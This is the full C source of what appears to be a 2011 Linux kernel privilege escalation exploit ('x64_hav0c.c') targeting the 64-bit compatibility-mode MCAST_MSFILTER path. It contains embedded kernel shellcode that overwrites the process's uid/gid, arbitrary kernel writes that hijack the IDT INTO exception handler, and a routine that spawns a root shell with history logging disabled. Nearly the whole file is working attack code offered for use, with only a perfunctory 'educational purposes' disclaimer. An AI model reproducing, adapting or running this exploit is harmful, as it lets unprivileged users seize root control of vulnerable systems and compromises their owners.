/****************************************************************************
 *	Linux 64-bit Compatibility Mode Stack Pointer Underflow 
 *		      Privilege escalation exploit
 *			a.k.a the compat mess
 *			  a.k.a x64_hav0c.c
 *			      by teach
 *
 * VxHell Labs CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of VxHell Labs.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * his author. This includes especially the Bugtraq mailing list, 
 * the www.exploit-db.com website and/or any public exploit archive.
 *
 * (C) COPYRIGHT teach, 2011
 * All Rights Reserved
 *
 * teach@vxhell.org
 *
 * For [teh lulz and maybe] educational purposes. Use it at your own risk.
**
******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/user.h>

struct __kernel_sockaddr_storage {
	char dummy[128];
};

struct compat_group_filter {
	unsigned int gf_interface;
	struct __kernel_sockaddr_storage gf_group __attribute__ ((aligned(4)));
	unsigned int gf_fmode;
	unsigned int gf_numsrc;
	struct __kernel_sockaddr_storage gf_slist[1] 
	__attribute__ ((aligned(4)));
} __attribute__ ((packed));

struct argsblock {
	int sockfd;
	int level;
	int optname;
	void *optval;
	socklen_t *optlen;
} __attribute__((packed));

struct idt_struct
{
	unsigned short limit;
	unsigned long base;
} __attribute__((packed));

unsigned int uid, gid;
int sockfd;
struct compat_group_filter gf32;
struct argsblock args;

/* this is pure magic and awesomeness: complete x64 priv. escalation shellcode blob */
char elitekernshellcodez[] = 
"\x55\x48\x89\xe5\x48\x83\xec\x10"
"\x48\xc7\x45\xf8\x00\x00\x00\x00"
"\xe8\x21\x00\x00\x00\x48\x89\x45"
"\xf8\x48\x83\x7d\xf8\x00\x75\x09"
"\xe8\x83\x00\x00\x00\x48\x89\x45"
"\xf8\x48\x8b\x7d\xf8\xe8\xd2\x00"
"\x00\x00\xc9\x48\xcf\xc3"
"\x55\x48\x89\xe5\x48\xc7\x45\xf8"
"\x00\x00\x00\x00\x48\x8d\x45\xf8"
"\x48\x89\x45\xf8\x48\x8b\x45\xf8"
"\x48\x25\x00\xf0\xff\xff\x48\x8b"
"\x00\x48\x89\x45\xf8\x48\x8b\x55"
"\xf8\x48\xb8\xff\xff\xff\xff\xff"
"\xff\xff\xef\x48\x39\xc2\x76\x0c"
"\x48\x8b\x45\xf8\x48\x3d\x00\x00"
"\x00\xf0\x76\x0a\x48\xc7\x45\xe8"
"\x00\x00\x00\x00\xeb\x1e\x48\x8b"
"\x45\xf8\x48\x8b\x00\x48\x85\xc0"
"\x74\x0a\x48\xc7\x45\xe8\x00\x00"
"\x00\x00\xeb\x08\x48\x8b\x45\xf8"
"\x48\x89\x45\xe8\x48\x8b\x45\xe8"
"\xc9\xc3"
"\x55\x48\x89\xe5\x48\xc7\x45\xf8"
"\x00\x00\x00\x00\x48\x8d\x45\xf8"
"\x48\x89\x45\xf8\x48\x8b\x45\xf8"
"\x48\x25\x00\xe0\xff\xff\x48\x8b"
"\x00\x48\x89\x45\xf8\x48\x8b\x55"
"\xf8\x48\xb8\xff\xff\xff\xff\xff"
"\xff\xff\xef\x48\x39\xc2\x76\x0c"
"\x48\x8b\x45\xf8\x48\x3d\x00\x00"
"\x00\xf0\x76\x0a\x48\xc7\x45\xe8"
"\x00\x00\x00\x00\xeb\x08\x48\x8b"
"\x45\xf8\x48\x89\x45\xe8\x48\x8b"
"\x45\xe8\xc9\xc3"
"\x55\x48\x89\xe5\x48\x89\x7d\xe8"
"\x48\x8b\x45\xe8\x48\x89\x45\xf8"
"\xc7\x45\xf4\x00\x00\x00\x00\xe9"
"\xde\x01\x00\x00\x8b\x45\xf4\x48"
"\x98\x48\xc1\xe0\x02\x48\x03\x45"
"\xf8\x8b\x00\x3d\x37\x13\x37\x13"
"\x0f\x85\xc0\x01\x00\x00\x48\x8b"
"\x55\xf8\x48\x83\xc2\x04\x8b\x45"
"\xf4\x48\x98\x48\xc1\xe0\x02\x48"
"\x8d\x04\x02\x8b\x00\x3d\x37\x13"
"\x37\x13\x0f\x85\x9e\x01\x00\x00"
"\x48\x8b\x55\xf8\x48\x83\xc2\x08"
"\x8b\x45\xf4\x48\x98\x48\xc1\xe0"
"\x02\x48\x8d\x04\x02\x8b\x00\x3d"
"\x37\x13\x37\x13\x0f\x85\x7c\x01"
"\x00\x00\x48\x8b\x55\xf8\x48\x83"
"\xc2\x0c\x8b\x45\xf4\x48\x98\x48"
"\xc1\xe0\x02\x48\x8d\x04\x02\x8b"
"\x00\x3d\x37\x13\x37\x13\x0f\x85"
"\x5a\x01\x00\x00\x48\x8b\x55\xf8"
"\x48\x83\xc2\x10\x8b\x45\xf4\x48"
"\x98\x48\xc1\xe0\x02\x48\x8d\x04"
"\x02\x8b\x00\x3d\xbe\xba\xad\xde"
"\x0f\x85\x38\x01\x00\x00\x48\x8b"
"\x55\xf8\x48\x83\xc2\x14\x8b\x45"
"\xf4\x48\x98\x48\xc1\xe0\x02\x48"
"\x8d\x04\x02\x8b\x00\x3d\xbe\xba"
"\xad\xde\x0f\x85\x16\x01\x00\x00"
"\x48\x8b\x55\xf8\x48\x83\xc2\x18"
"\x8b\x45\xf4\x48\x98\x48\xc1\xe0"
"\x02\x48\x8d\x04\x02\x8b\x00\x3d"
"\xbe\xba\xad\xde\x0f\x85\xf4\x00"
"\x00\x00\x48\x8b\x55\xf8\x48\x83"
"\xc2\x1c\x8b\x45\xf4\x48\x98\x48"
"\xc1\xe0\x02\x48\x8d\x04\x02\x8b"
"\x00\x3d\xbe\xba\xad\xde\x0f\x85"
"\xd2\x00\x00\x00\x8b\x45\xf4\x48"
"\x98\x48\xc1\xe0\x02\x48\x03\x45"
"\xf8\xc7\x00\x00\x00\x00\x00\x48"
"\x8b\x55\xf8\x48\x83\xc2\x04\x8b"
"\x45\xf4\x48\x98\x48\xc1\xe0\x02"
"\x48\x8d\x04\x02\xc7\x00\x00\x00"
"\x00\x00\x48\x8b\x55\xf8\x48\x83"
"\xc2\x08\x8b\x45\xf4\x48\x98\x48"
"\xc1\xe0\x02\x48\x8d\x04\x02\xc7"
"\x00\x00\x00\x00\x00\x48\x8b\x55"
"\xf8\x48\x83\xc2\x0c\x8b\x45\xf4"
"\x48\x98\x48\xc1\xe0\x02\x48\x8d"
"\x04\x02\xc7\x00\x00\x00\x00\x00"
"\x48\x8b\x55\xf8\x48\x83\xc2\x10"
"\x8b\x45\xf4\x48\x98\x48\xc1\xe0"
"\x02\x48\x8d\x04\x02\xc7\x00\x00"
"\x00\x00\x00\x48\x8b\x55\xf8\x48"
"\x83\xc2\x14\x8b\x45\xf4\x48\x98"
"\x48\xc1\xe0\x02\x48\x8d\x04\x02"
"\xc7\x00\x00\x00\x00\x00\x48\x8b"
"\x55\xf8\x48\x83\xc2\x18\x8b\x45"
"\xf4\x48\x98\x48\xc1\xe0\x02\x48"
"\x8d\x04\x02\xc7\x00\x00\x00\x00"
"\x00\x48\x8b\x55\xf8\x48\x83\xc2"
"\x1c\x8b\x45\xf4\x48\x98\x48\xc1"
"\xe0\x02\x48\x8d\x04\x02\xc7\x00"
"\x00\x00\x00\x00\xeb\x11\x83\x45"
"\xf4\x01\x81\x7d\xf4\xff\x0f\x00"
"\x00\x0f\x8e\x15\xfe\xff\xff\xc9"
"\xc3";

void fill_shellcode(void) {
	
	unsigned char *p = (unsigned char *)elitekernshellcodez;
	int i;
	for(i=0; i<sizeof(elitekernshellcodez); i++) {
		if( *(unsigned int *)(p+i) == 0x13371337) {
			*(unsigned int *)(p+i) = uid;
		}
		if( *(unsigned int *)(p+i) == 0xdeadbabe) {
			*(unsigned int *)(p+i) = gid;
		}
	}
}

void kernel_write(unsigned long long where, unsigned long what) {

	unsigned int esp=0x00407350;
	unsigned int *ptr, *addr, i;
	unsigned long *ptrargs;
	
	printf("[+] Switching new stack to 0x%x\n", esp);
	addr = mmap(
			(unsigned int *)(esp & (~(PAGE_SIZE-1))), 
			PAGE_SIZE, 
			PROT_READ | PROT_WRITE, 
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0
		);
			
	if(addr == MAP_FAILED || addr != (unsigned int *)(esp & (~(PAGE_SIZE-1)))) {
		perror("[-] mmap");
		exit(-1);
	}
	
	esp = esp - where - 0x8;
	printf("[+] computed len: 0x%x\n", esp);
	
	memset(&gf32, 0x00, sizeof(struct compat_group_filter));
	ptr = (unsigned int *)&gf32;
	for(i=0; i<sizeof(struct compat_group_filter); i++)
		ptr[i] = what;
	args.sockfd = sockfd;
	args.level = SOL_IP;
	args.optname = MCAST_MSFILTER;
	args.optval = &gf32;
	args.optlen = &esp;
	ptrargs = (unsigned long *)&args;
	
	sleep(1);
	__asm__ __volatile__(
		"push %%ebx\n\t"
		"push %%ecx\n\t"
		"movl $0x66, %%eax\n\t"
		"movl $0xf, %%ebx\n\t"
		"movl %0, %%ecx\n\t"
		"movl %%esp, %%edx\n\t"
		"movl $0x00407350, %%esp\n\t"
		"int $0x80\n\t"
		"movl %%edx, %%esp\n\t"
		"pop %%ecx\n\t"	
		"pop %%ebx\n\t"	
		: 
		: "r"(ptrargs)
		: "memory", "eax", "ebx", "ecx", "edx"
	);
	munmap(addr, PAGE_SIZE);
}

void spawn_rootshell(void) 
{
	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
	"TERM=linux", "BASH_HISTORY=/dev/null",
	"HISTORY=/dev/null", "history=/dev/null",
	"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", 
	 NULL 
	};

	execve("/bin/sh", argv, envp);
	printf("[-]Error: unable to spawn a shell\n");
	exit(-1);
}

int main(int argc, char *argv[]) {

	struct idt_struct idt;
	unsigned long long idt64base, entry;
	unsigned long addr = 0;
	unsigned char *kscaddr = (unsigned char *)0x73507350;
	
	printf(
"			.::: VxHell Labs presents :::.\n"
"	.:: Linux 64-bit Compatibility Mode Stack Pointer Underflow ::.\n"
"		      .:: Privilege escalation exploit ::.\n"
"			      .:: by teach ::.\n"
	);
   
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0) {
		perror("[-] socket");
		exit(-1);
	}
	
	uid = getuid();
	gid = getgid();
	
	memset(&idt, 0x00, sizeof(struct idt_struct));
	__asm__ __volatile__("sidt %0\n\t" : "=m"(idt));
	idt64base = idt.base | 0xFFFFFFFF00000000ULL;
	printf("[+] IDT found at 0x%llx ... \n", idt64base);
	
	entry = idt64base + (16*0x04);	
	printf("[+] INTO exception vector address: 0x%llx \n", entry);
	
	kscaddr = mmap(
			(unsigned char *)((unsigned int)kscaddr & (~(PAGE_SIZE-1))), 
			PAGE_SIZE*2, 
			PROT_READ | PROT_WRITE | PROT_EXEC, 
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0
		);
	if(kscaddr == MAP_FAILED) {
		perror("[-] mmap kernel shellcode:");
		exit(-1);
	}
	memset((unsigned char *)((unsigned int)kscaddr & (~(PAGE_SIZE-1))), 0x90, PAGE_SIZE*2);
	fill_shellcode();
	memcpy(kscaddr+100, elitekernshellcodez, sizeof(elitekernshellcodez));
	printf("[+] Mapping kernel shellcode at %p ... \n", kscaddr+100);
	
	addr = ( (unsigned long)kscaddr << 16 ) | 0xffff;
	addr = addr & 0xffff0000;
	printf("[+] Overwriting low 16bits of INTO exception handler address ... \n");	
	kernel_write(entry-2, addr);
	addr = ( (unsigned long)kscaddr >> 16 ) | 0xffff0000;
	printf("[+] Overwriting mid 16bits of INTO exception handler address ... \n");	
	kernel_write(entry+6, addr);
	printf("[+] Overwriting high 32bits of INTO exception handler address ... \n");	
	kernel_write(entry+8, 0x00000000);
	
	printf("[+] Triggering INTO exception...\n");
	__asm__ __volatile__(
			"cld\n\t"
			"movl $0x7FFFFFFF, %%eax\n\t"
			"addl $0x7FFFFFFF, %%eax\n\t"
			"into\n\t"
			::: "eax"
			);
	
	if(getuid() == 0){
		printf("[+] Got root !\n");
		spawn_rootshell();
	}
	else
		printf("[-] Exploit failed. Shit happens ...?\n");
		
	munmap((unsigned char *)((unsigned int)kscaddr & (~(PAGE_SIZE-1))), PAGE_SIZE*2);
	return -1;
}




